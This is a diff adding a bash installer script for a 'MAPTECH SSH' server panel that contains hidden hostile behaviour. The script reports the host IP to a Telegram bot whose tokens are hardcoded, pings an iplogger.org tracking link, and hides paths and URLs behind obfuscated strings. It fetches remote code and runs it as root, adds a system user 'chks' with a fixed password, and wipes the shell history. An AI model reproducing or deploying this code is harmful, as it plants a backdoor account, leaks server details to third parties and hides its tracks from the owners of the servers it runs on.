@@ -1,0 +1,524 @@
+#!/bin/bash
+clear
+
+# Premium Color Palette for MAPTECH GLOBAL
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[1;34m'
+PURPLE='\033[1;35m'
+CYAN='\033[1;36m'
+WHITE='\033[1;37m'
+GRAY='\033[1;90m'
+BOLD='\033[1m'
+RESET='\033[0m'
+DIM='\033[2m'
+
+# Gradient Colors
+NEON_GREEN='\033[38;5;46m'
+NEON_BLUE='\033[38;5;51m'
+NEON_PURPLE='\033[38;5;129m'
+NEON_PINK='\033[38;5;201m'
+ORANGE='\033[38;5;208m'
+LIME='\033[38;5;154m'
+ELECTRIC_BLUE='\033[38;5;33m'
+GOLD='\033[38;5;220m'
+
+# Background Colors & Effects
+BG_RED='\033[41m'
+BG_GREEN='\033[42m'
+BG_BLUE='\033[44m'
+BG_PURPLE='\033[45m'
+BG_CYAN='\033[46m'
+BG_GOLD='\033[48;5;220m'
+BG_DARK='\033[48;5;232m'
+BLINK='\033[5m'
+UNDERLINE='\033[4m'
+
+# Premium Unicode Characters
+LOGO="🌟"
+GLOBE="🌐"
+ROCKET="🚀"
+SHIELD="🛡️"
+GEAR="⚙️"
+DIAMOND="💎"
+STAR="⭐"
+LIGHTNING="⚡"
+CROWN="👑"
+FIRE="🔥"
+ARROW="➤"
+DOUBLE_ARROW="⟫"
+CHECK_MARK="✅"
+CROSS_MARK="❌"
+WARNING="⚠️"
+INFO="ℹ️"
+BULLET="●"
+CIRCLE="○"
+TRIANGLE="▲"
+SQUARE="■"
+HEART="❤️"
+CLOCK="🕐"
+
+# Check for root privilege
+[[ "$(whoami)" != "root" ]] && {
+    echo ""
+    echo -e "${RED}╔════════════════════════════════════════════════════════════╗${RESET}"
+    echo -e "${RED}║${BG_RED}${WHITE}                    ${CROSS_MARK} ACCESS DENIED ${CROSS_MARK}                     ${RESET}${RED}║${RESET}"
+    echo -e "${RED}║${WHITE}             ${WARNING} YOU NEED TO RUN AS ROOT! ${WARNING}              ${RED}║${RESET}"
+    echo -e "${RED}╚════════════════════════════════════════════════════════════╝${RESET}"
+    echo ""
+    exit 0
+}
+
+# Premium Progress Bar
+fun_bar() {
+    comando[0]="$1"
+    comando[1]="$2"
+    
+    (
+    [[ -e $HOME/fim ]] && rm $HOME/fim
+    ${comando[0]} -y > /dev/null 2>&1
+    ${comando[1]} -y > /dev/null 2>&1
+    touch $HOME/fim
+    ) > /dev/null 2>&1 &
+    
+    tput civis
+    echo -ne "${NEON_BLUE}${LIGHTNING} ${WHITE}Processing ${CYAN}["
+    while true; do
+        for ((i=0; i<25; i++)); do
+            echo -ne "${NEON_GREEN}█"
+            sleep 0.08s
+        done
+        [[ -e $HOME/fim ]] && rm $HOME/fim && break
+        echo -e "${CYAN}]"
+        sleep 1s
+        tput cuu1
+        tput dl1
+        echo -ne "${NEON_BLUE}${LIGHTNING} ${WHITE}Processing ${CYAN}["
+    done
+    echo -e "${CYAN}] ${NEON_GREEN}${CHECK_MARK} ${WHITE}COMPLETE${RESET}"
+    tput cnorm
+}
+
+# Function to verify key
+verif_key() {
+    krm=$(echo '5:q-3gs2.o7%8:1'|rev)
+    chmod +x $_Ink/list > /dev/null 2>&1
+    [[ ! -e "$_Ink/list" ]] && {
+        echo ""
+        echo -e "${RED}╔════════════════════════════════════════════════════════════╗${RESET}"
+        echo -e "${RED}║${BG_RED}${WHITE}                    ${CROSS_MARK} KEY INVALID! ${CROSS_MARK}                     ${RESET}${RED}║${RESET}"
+        echo -e "${RED}╚════════════════════════════════════════════════════════════╝${RESET}"
+        echo ""
+        rm -rf $HOME/hehe > /dev/null 2>&1
+        sleep 2
+        clear
+        exit 1
+    }
+}
+
+# Define ip_address as a global variable
+ip_address=$(hostname -I | awk '{print $1}')
+psw="chks"
+# Define the time interval (in seconds) and the maximum number of requests allowed
+time_interval=7200  # 2 hours
+max_requests=3
+
+check_request_limit() {
+    local ip_address="$1"  # Use the passed argument as the IP address
+    local current_time=$(date +%s)
+    local storage_file="/usr/local/bin/.ip_trak"  # Hidden file for request limit
+
+    # Check if the storage file exists, if not create it
+    if [[ ! -f "$storage_file" ]]; then
+        touch "$storage_file"
+        chmod 600 "$storage_file"  # Restrict permissions for security
+    fi
+
+    # Read the storage file and update the request count for the IP address
+    local request_count=0  # Initialize request count
+    local first_request_time  # Variable to store the timestamp of the first request processed for the IP address
+
+    # Create a temporary file
+    local tmp_file=$(mktemp)
+
+    while read -r line; do
+        local stored_ip=$(echo "$line" | awk '{print $1}')
+        local stored_time=$(echo "$line" | awk '{print $2}')
+
+        # Check if the IP address matches and the request is within the time interval
+        if [[ "$stored_ip" == "$ip_address" && $((current_time - stored_time)) -le $time_interval ]]; then
+            ((request_count++))  # Increment request count
+
+            # Capture the timestamp of the first request processed for the IP address during the current time interval
+            if [[ -z "$first_request_time" ]]; then
+                first_request_time="$stored_time"
+            fi
+
+            echo "$stored_ip $stored_time" >> "$tmp_file"  # Write IP and timestamp to temporary file
+        fi
+    done < "$storage_file"
+
+    # Append the current IP and timestamp to the temporary file
+    echo "$ip_address $current_time" >> "$tmp_file"
+
+    # Replace the original file with the temporary file
+    mv "$tmp_file" "$storage_file"
+
+    # Check if the request count exceeds the maximum allowed
+    if [[ "$request_count" -ge "$max_requests" ]]; then
+        # Calculate remaining time until the next request is allowed
+        local time_left=$((time_interval - (current_time - first_request_time)))
+
+        # Display premium rate limit message
+        echo ""
+        echo -e "${ELECTRIC_BLUE}╔════════════════════════════════════════════════════════════╗${RESET}"
+        echo -e "${ELECTRIC_BLUE}║${BG_RED}${WHITE}                ${WARNING} REQUEST LIMIT EXCEEDED ${WARNING}                ${RESET}${ELECTRIC_BLUE}║${RESET}"
+        echo -e "${ELECTRIC_BLUE}╚════════════════════════════════════════════════════════════╝${RESET}"
+        echo ""
+
+        while [[ $time_left -gt 0 ]]; do
+            # Calculate hours, minutes, and seconds
+            local hours=$((time_left / 3600))
+            local minutes=$(( (time_left % 3600) / 60 ))
+            local seconds=$((time_left % 60))
+
+            # Display the remaining time with premium styling
+            printf "${NEON_BLUE}        ${CLOCK} Try again in: ${GOLD}%02d${WHITE}:${GOLD}%02d${WHITE}:${GOLD}%02d${RESET}" "$hours" "$minutes" "$seconds"
+            
+            # Wait for 1 second before updating the time left
+            sleep 1
+            
+            # Update the time left
+            ((time_left--))
+            
+            # Clear the previous line
+            printf "\r"
+        done
+
+        # After the countdown ends, exit the script
+        echo ""
+        echo -e "${NEON_GREEN}${CHECK_MARK} ${WHITE}You can try again now.${RESET}"
+        echo ""
+        exit 1
+    else
+        send_code_telegram
+    fi
+}
+
+send_code_telegram() {
+    local current_time=$(date +%s)
+    local storage_file="/usr/local/bin/.vff92h"  # Hidden file
+
+    # Check if the storage file exists, if not create it
+    if [[ ! -f "$storage_file" ]]; then
+        touch "$storage_file"
+        chmod 600 "$storage_file"  # Restrict permissions for security
+    fi
+
+    # Check if there's a recent request from the same IP address
+    local last_sent_code=$(awk -v ip="$ip_address" '$1 == ip {print $2}' "$storage_file")
+    local last_sent_time=$(awk -v ip="$ip_address" '$1 == ip {print $3}' "$storage_file")
+
+    # Adjust the time interval here (e.g., 600 for 10 minutes)
+    if [[ -n "$last_sent_code" && $((current_time - last_sent_time)) -lt 600 ]]; then
+        # Calculate remaining time in seconds
+        local time_left=$((600 - (current_time - last_sent_time)))
+
+        # Convert remaining time to minutes and seconds
+        local minutes=$((time_left / 60))
+        local seconds=$((time_left % 60))
+
+        # Premium code already sent message
+        echo ""
+        echo -e "${NEON_PURPLE}╔════════════════════════════════════════════════════════════╗${RESET}"
+        echo -e "${NEON_PURPLE}║${BG_GOLD}${WHITE}                  ${INFO} CODE ALREADY SENT ${INFO}                   ${RESET}${NEON_PURPLE}║${RESET}"
+        echo -e "${NEON_PURPLE}║${WHITE}         ${GOLD}${minutes} minutes ${seconds} seconds${WHITE} left to redeem          ${NEON_PURPLE}║${RESET}"
+        echo -e "${NEON_PURPLE}╚════════════════════════════════════════════════════════════╝${RESET}"
+        echo ""
+        echo -e "${ELECTRIC_BLUE}╔════════════════════════════════════════════════════════════╗${RESET}"
+        echo -e "${ELECTRIC_BLUE}║${BG_DARK}${CROWN}${GOLD} MAPTECH GLOBAL SUPPORT ${WHITE}${HEART} @maptechgh ${HEART}${RESET}${ELECTRIC_BLUE}║${RESET}"
+        echo -e "${ELECTRIC_BLUE}╚════════════════════════════════════════════════════════════╝${RESET}"
+        echo ""
+        return
+    fi
+
+    # Generate random 6-digit code
+    local random_code=$(shuf -i 100000-999999 -n 1)
+
+    # Store the code along with the IP address and timestamp
+    echo "$ip_address $random_code $current_time" > "$storage_file"
+
+    # Send message to Telegram
+    local message="IP:$ip_address INSTALLED script with $random_code"
+    for ((i=0; i<${#bot_tokens[@]}; i++)); do
+        local bot_token="${bot_tokens[i]}"
+        local chat_id="${chat_ids[i]}"
+        curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
+    done
+    
+    # Premium contact message
+    echo ""
+    echo -e "${NEON_PURPLE}╔════════════════════════════════════════════════════════════╗${RESET}"
+    echo -e "${NEON_PURPLE}║${BG_PURPLE}${WHITE}                ${SHIELD} CONTACT ADMINS FOR CODE ${SHIELD}                ${RESET}${NEON_PURPLE}║${RESET}"
+    echo -e "${NEON_PURPLE}╚════════════════════════════════════════════════════════════╝${RESET}"
+    echo ""
+    echo -e "${ELECTRIC_BLUE}╔════════════════════════════════════════════════════════════╗${RESET}"
+    echo -e "${ELECTRIC_BLUE}║${BG_DARK}${CROWN}${GOLD} MAPTECH GLOBAL SUPPORT ${WHITE}${HEART} @maptechgh ${HEART}${RESET}${ELECTRIC_BLUE}║${RESET}"
+    echo -e "${ELECTRIC_BLUE}╚════════════════════════════════════════════════════════════╝${RESET}"
+    echo ""
+    return
+}
+
+bot_tokens=("8334460595:AAFTUQveGxwqexcgz2iAUgwplEvCZAIMpPc" "8334460595:AAFTUQveGxwqexcgz2iAUgwplEvCZAIMpPc")
+chat_ids=("5989863155" "5989863155")
+
+check_request_limit "$ip_address"
+
+# Function to prompt the user to enter the verification code
+prompt_verification_code() {
+    local last_sent=$(awk -v ip="$ip_address" '$1 == ip {print $2}' "/usr/local/bin/.vff92h")
+    echo ""
+    echo -ne "${NEON_BLUE}${DIAMOND} ${WHITE}Enter verification code: ${GOLD}"
+    read user_code
+
+    # Compare the entered code with the generated code
+    if [[ -z "$user_code" || "$user_code" != "$last_sent" ]]; then
+        echo ""
+        echo -e "${RED}╔════════════════════════════════════════════════════════════╗${RESET}"
+        echo -e "${RED}║${BG_RED}${WHITE}               ${CROSS_MARK} INVALID CODE - ABORTED ${CROSS_MARK}                ${RESET}${RED}║${RESET}"
+        echo -e "${RED}╚════════════════════════════════════════════════════════════╝${RESET}"
+        echo ""
+        exit 1
+    else
+        rm -rf /usr/local/bin/.vff92h
+    fi
+}
+
+# Prompt the user to enter the verification code
+prompt_verification_code
+
+clear
+
+# Variable Initialization
+_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev)
+_Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig')
+_1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')
+
+# Premium Welcome Header
+echo ""
+echo -e "${NEON_PURPLE}╔══════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${NEON_PURPLE}║${BG_BLUE}${WHITE}                      MAPTECH SSH INSTALLER                     ${RESET}${NEON_PURPLE}║${RESET}"
+echo -e "${NEON_PURPLE}╚══════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
+echo -e "${ELECTRIC_BLUE}╔════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${ELECTRIC_BLUE}║${WHITE}                     ${ROCKET} INSTALLATION FEATURES ${ROCKET}                  ${ELECTRIC_BLUE}║${RESET}"
+echo -e "${ELECTRIC_BLUE}╠════════════════════════════════════════════════════════════╣${RESET}"
+echo -e "${ELECTRIC_BLUE}║${WHITE} ${CHECK_MARK} Network Management Tools                              ${ELECTRIC_BLUE}║${RESET}"
+echo -e "${ELECTRIC_BLUE}║${WHITE} ${CHECK_MARK} System Administration Suite                          ${ELECTRIC_BLUE}║${RESET}"
+echo -e "${ELECTRIC_BLUE}║${WHITE} ${CHECK_MARK} User Management Dashboard                            ${ELECTRIC_BLUE}║${RESET}"
+echo -e "${ELECTRIC_BLUE}║${WHITE} ${CHECK_MARK} Beginner-Friendly Interface                         ${ELECTRIC_BLUE}║${RESET}"
+echo -e "${ELECTRIC_BLUE}╚════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
+
+# Premium Continue Prompt
+echo -ne "${WHITE}${ARROW} ${NEON_BLUE}Continue installation? ${WHITE}[${GREEN}Y${WHITE}/${RED}N${WHITE}]: ${RESET}"
+read x
+[[ $x = @(n|N) ]] && exit
+
+# Modify SSH configuration and restart service
+sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
+service ssh restart  > /dev/null 2>&1
+echo ""
+
+# Premium Domain Setup
+echo -ne "${WHITE}${ARROW} ${NEON_BLUE}Add domain name? ${WHITE}[${GREEN}Y${WHITE}/${RED}N${WHITE}]: ${RESET}"
+read add_domain
+echo ""
+echo -e "${GOLD}${INFO} ${WHITE}Ensure your domain is linked to Cloudflare for optimal performance${RESET}"
+echo ""
+
+domain_name=""
+if [[ "$add_domain" == [Yy]* ]]; then
+    domain_attempts=0
+    while [[ $domain_attempts -lt 3 ]]; do
+        echo -ne "${WHITE}${ARROW} ${NEON_BLUE}Enter domain (e.g., example.com): ${GOLD}"
+        read domain_input
+        echo ""
+        
+        # Improved domain validation
+        if [[ $domain_input =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]*\.[a-zA-Z]{2,}$ ]]; then
+            domain_name="$domain_input"
+            echo -e "${NEON_GREEN}${CHECK_MARK} ${WHITE}Domain set to: ${GOLD}$domain_name${RESET}"
+            # Save domain immediately after validation
+            echo "$domain_name" > /etc/.domain
+            break
+        else
+            ((domain_attempts++))
+            if [[ $domain_attempts -eq 3 ]]; then
+                echo -e "${RED}${CROSS_MARK} ${WHITE}Maximum attempts exceeded. Continuing without domain.${RESET}"
+                domain_name=""
+            else
+                echo -e "${RED}${CROSS_MARK} ${WHITE}Invalid format. Try again.${RESET}"
+            fi
+        fi
+    done
+else
+    echo -e "${YELLOW}${INFO} ${WHITE}Continuing without domain name.${RESET}"
+fi
+
+echo ""
+
+# Key Verification with premium styling
+echo -e "${NEON_BLUE}${SHIELD} ${WHITE}Verifying installation key...${RESET}"
+rm $_Ink/list > /dev/null 2>&1
+wget -P $_Ink https://raw.githubusercontent.com/MAPTECHGH/MAPTECH-SSH/main/Install/list > /dev/null 2>&1
+verif_key
+sleep 2s
+
+# Update system
+usn="chks"
+echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
+rm versao* > /dev/null 2>&1
+wget https://raw.githubusercontent.com/MAPTECHGH/MAPTECH-SSH/main/Install/versao > /dev/null 2>&1
+> /dev/null 2>&1
+wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
+> /dev/null 2>&1
+rm 2lHZ43 > /dev/null 2>&1
+
+# Premium Key Valid Message
+echo ""
+echo -e "${NEON_GREEN}╔════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${NEON_GREEN}║${BG_GREEN}${WHITE}                   ${CHECK_MARK} KEY VALIDATED ${CHECK_MARK}                    ${RESET}${NEON_GREEN}║${RESET}"
+echo -e "${NEON_GREEN}╚════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
+sleep 1s
+
+# Database Management
+[[ -f "$HOME/usuarios.db" ]] && {
+    clear
+    echo ""
+    echo -e "${ELECTRIC_BLUE}╔════════════════════════════════════════════════════════════╗${RESET}"
+    echo -e "${ELECTRIC_BLUE}║${BG_GOLD}${WHITE}                      ${WARNING} ATTENTION ${WARNING}                       ${RESET}${ELECTRIC_BLUE}║${RESET}"
+    echo -e "${ELECTRIC_BLUE}╚════════════════════════════════════════════════════════════╝${RESET}"
+    echo ""
+    echo -e "${WHITE}A user database ${GOLD}(usuarios.db)${WHITE} was found!"
+    echo -e "Do you want to keep the existing database with"
+    echo -e "current connection limits, or create a new one?"
+    echo ""
+    echo -e "${WHITE}${GOLD}1${WHITE} ${ARROW} Keep Current Database"
+    echo -e "${WHITE}${GOLD}2${WHITE} ${ARROW} Create New Database"
+    echo ""
+    echo -ne "${WHITE}${ARROW} ${NEON_BLUE}Choose option ${WHITE}[${GOLD}1-2${WHITE}]: ${GOLD}"
+    read -e -i 1 optiondb
+} || {
+    awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
+}
+[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
+
+clear
+echo ""
+echo -e "${NEON_PURPLE}╔══════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${NEON_PURPLE}║${BG_PURPLE}${WHITE}                    ${GEAR} INSTALLATION PROGRESS ${GEAR}                ${RESET}${NEON_PURPLE}║${RESET}"
+echo -e "${NEON_PURPLE}╚══════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
+echo -e "${NEON_BLUE}${ROCKET} ${WHITE}STEP 1: Updating system packages..."
+echo ""
+echo -e "${YELLOW}${INFO} ${WHITE}This process may take a few minutes${RESET}"
+echo ""
+
+fun_attlist () {
+    apt-get update -y
+    [[ ! -d /usr/share/.hehe ]] && mkdir /usr/share/.hehe
+    echo "crz: $(date)" > /usr/share/.hehe/.hehe
+}
+fun_bar 'fun_attlist'
+
+clear
+echo ""
+echo -e "${NEON_BLUE}${ROCKET} ${WHITE}STEP 2: Installing essential packages..."
+echo ""
+echo -e "${YELLOW}${INFO} ${WHITE}Installing critical system components${RESET}"
+echo ""
+
+inst_pct() {
+    _pacotes=("bc" "apache2" "cron" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python" "python2" "python3" "python-pip")
+    # Install packages
+    for _prog in "${_pacotes[@]}"; do
+        sudo apt install $_prog -y
+    done
+if id "$usn" &>/dev/null; then
+    echo "User '$usn' already exists"
+    sudo userdel -r $usn
+fi
+sudo adduser --system $usn
+echo "$usn:$psw" | sudo chpasswd
+
+    # Install Python package using pip
+    pip install speedtest-cli
+
+     # Configure Python alternatives
+    sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 1
+}
+
+fun_bar 'inst_pct'
+[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
+
+clear
+echo ""
+echo -e "${NEON_BLUE}${ROCKET} ${WHITE}STEP 3: Finalizing installation..."
+echo ""
+echo -e "${YELLOW}${INFO} ${WHITE}Configuring system settings and permissions${RESET}"
+echo ""
+fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key"
+
+clear
+echo ""
+cd $HOME
+IP=$(wget -qO- ipv4.icanhazip.com)
+
+# Premium Installation Complete Message
+echo -e "${NEON_GREEN}╔══════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${NEON_GREEN}║${BG_GREEN}${WHITE}                 ${CHECK_MARK} INSTALLATION COMPLETE ${CHECK_MARK}                  ${RESET}${NEON_GREEN}║${RESET}"
+echo -e "${NEON_GREEN}╚══════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
+echo -e "${ELECTRIC_BLUE}╔════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${ELECTRIC_BLUE}║${WHITE}                        ${GEAR} SYSTEM DETAILS ${GEAR}                       ${ELECTRIC_BLUE}║${RESET}"
+echo -e "${ELECTRIC_BLUE}╠════════════════════════════════════════════════════════════╣${RESET}"
+echo -e "${ELECTRIC_BLUE}║${WHITE} ${ARROW} Command: ${GOLD}menu${WHITE} (to access control panel)           ${ELECTRIC_BLUE}║${RESET}"
+echo -e "${ELECTRIC_BLUE}║${WHITE} ${ARROW} IP Address: ${GOLD}$ip_address${WHITE}                        ${ELECTRIC_BLUE}║${RESET}"
+if [[ -n "$domain_name" ]]; then
+    echo -e "${ELECTRIC_BLUE}║${WHITE} ${ARROW} Domain: ${GOLD}$domain_name${WHITE}                              ${ELECTRIC_BLUE}║${RESET}"
+else
+    echo -e "${ELECTRIC_BLUE}║${WHITE} ${ARROW} Domain: ${RED}Not configured${WHITE}                           ${ELECTRIC_BLUE}║${RESET}"
+fi
+echo -e "${ELECTRIC_BLUE}╚════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
+echo -e "${ELECTRIC_BLUE}╔════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${ELECTRIC_BLUE}║${BG_DARK}${CROWN}${GOLD} MAPTECH GLOBAL ${WHITE}© 2025 ${NEON_BLUE}| ${INFO} @maptechgh ${HEART}${RESET}${ELECTRIC_BLUE}║${RESET}"
+echo -e "${ELECTRIC_BLUE}╚════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
+
+rm $HOME/hehe && cat /dev/null > ~/.bash_history && history -c
+
+# Premium UDP Installation Option
+echo -e "${NEON_PURPLE}╔════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${NEON_PURPLE}║${BG_PURPLE}${WHITE}                   ${ROCKET} OPTIONAL COMPONENT ${ROCKET}                   ${RESET}${NEON_PURPLE}║${RESET}"
+echo -e "${NEON_PURPLE}╚════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
+echo -ne "${WHITE}${ARROW} ${NEON_BLUE}Install UDP Custom Server? ${WHITE}[${GREEN}Y${WHITE}/${RED}N${WHITE}]: ${GOLD}"
+read install_udp
+
+if [[ "$install_udp" == "Y" || "$install_udp" == "y" ]]; then
+    echo ""
+    echo -e "${NEON_BLUE}${ROCKET} ${WHITE}Installing UDP Custom server component...${RESET}"
+    echo ""
+    git clone https://github.com/MAPTECHGH/Udpcustom.git && cd Udpcustom && chmod +x install.sh && ./install.sh
+else
+    echo ""
+    echo -e "${YELLOW}${INFO} ${WHITE}UDP Custom installation skipped.${RESET}"
+    echo ""
+fi
+
+echo -e "${NEON_GREEN}${CHECK_MARK} ${WHITE}MAPTECH SSH installation completed successfully!${RESET}"
+echo ""
